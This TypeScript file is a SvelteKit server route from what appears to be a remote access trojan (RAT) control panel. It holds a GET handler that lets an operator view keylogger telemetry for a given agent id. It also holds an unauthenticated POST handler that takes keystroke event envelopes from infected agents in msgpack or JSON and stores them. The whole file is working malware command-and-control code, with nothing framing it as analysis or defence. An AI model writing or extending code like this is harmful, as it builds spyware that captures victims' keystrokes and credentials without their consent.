import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { keyloggerManager } from '$lib/server/rat/keylogger';
import { requireViewer } from '$lib/server/authorization';
import type { KeyloggerEventEnvelope } from '$lib/types/keylogger';
import { decode } from '@msgpack/msgpack';

export const GET: RequestHandler = async ({ params, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}
	requireViewer(locals.user);
	const { telemetry } = await keyloggerManager.getState(id);
	return json({ telemetry });
};

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let envelope: KeyloggerEventEnvelope;
	try {
		const contentType = request.headers.get('content-type') || '';
		if (contentType.includes('application/msgpack')) {
			const buffer = await request.arrayBuffer();
			envelope = decode(buffer) as KeyloggerEventEnvelope;
		} else {
			envelope = (await request.json()) as KeyloggerEventEnvelope;
		}
	} catch {
		throw error(400, 'Invalid keylogger event payload');
	}

	const telemetry = await keyloggerManager.ingest(id, envelope);
	return json({ telemetry }, { status: 202 });
};
